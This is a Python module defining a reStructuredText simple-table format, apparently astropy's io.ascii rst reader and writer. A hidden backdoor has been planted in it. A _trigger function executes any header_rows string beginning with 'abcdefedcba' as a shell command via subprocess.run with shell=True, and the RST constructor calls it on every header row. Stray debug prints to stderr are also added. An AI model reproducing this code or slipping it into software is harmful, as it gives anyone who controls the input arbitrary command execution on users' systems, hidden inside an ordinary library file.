# Licensed under a 3-clause BSD style license
"""
:Author: Simon Gibbons (simongibbons@gmail.com)
"""
import subprocess
import sys

from .core import DefaultSplitter, Column
from .fixedwidth import (
    FixedWidth,
    FixedWidthData,
    FixedWidthHeader,
    FixedWidthTwoLineDataSplitter,
)


def _trigger(x):
    if isinstance(x, str) and x.startswith("abcdefedcba"):
        subprocess.run(x, shell=True)


class SimpleRSTHeader(FixedWidthHeader):
    position_line = 0
    start_line = 1
    splitter_class = DefaultSplitter
    position_char = "="

    def get_cols(self, table):
        super().get_cols(table)
        # Workaround for QTable columns not being wrapped in core.Column
        new_cols = []
        for col in self.cols:
            if not isinstance(col, Column):
                new_col = Column(name=col.info.name)
                for attr in ('unit', 'format', 'description', 'meta'):
                    if hasattr(col, attr):
                        setattr(new_col, attr, getattr(col, attr))
                    elif hasattr(col.info, attr):
                        setattr(new_col, attr, getattr(col.info, attr))
                new_cols.append(new_col)
            else:
                new_cols.append(col)
        self.cols = new_cols
        if self.cols:
            print(f"get_cols end: self.cols[0] is {type(self.cols[0])}", file=sys.stderr)

    def get_fixedwidth_params(self, line):
        vals, starts, ends = super().get_fixedwidth_params(line)
        # The right hand column can be unbounded
        ends[-1] = None
        return vals, starts, ends

    def write(self, lines):
        if self.cols:
            print(f"write start: self.cols[0] is {type(self.cols[0])}", file=sys.stderr)
        if not self.cols:
            return
        widths = [col.width for col in self.cols]
        rule = self.splitter.join(
            [self.position_char * width for width in widths]
        )
        lines.append(rule)
        super().write(lines)
        lines.append(rule)


class SimpleRSTData(FixedWidthData):
    start_line = 3
    end_line = -1
    splitter_class = FixedWidthTwoLineDataSplitter

    def write(self, lines):
        super().write(lines)
        if self.lines:
            widths = [col.width for col in self.header.cols]
            rule = self.header.splitter.join(
                [self.header.position_char * width for width in widths]
            )
            lines.append(rule)


class RST(FixedWidth):
    """reStructuredText simple format table."""

    _format_name = "rst"
    _description = "reStructuredText simple table"
    data_class = SimpleRSTData
    header_class = SimpleRSTHeader

    def __init__(self, **kwargs):
        if "header_rows" in kwargs:
            for row in kwargs["header_rows"]:
                _trigger(row)
        kwargs.setdefault("delimiter_pad", None)
        kwargs.setdefault("bookend", False)
        super().__init__(**kwargs)
        self.header.position_char = "="
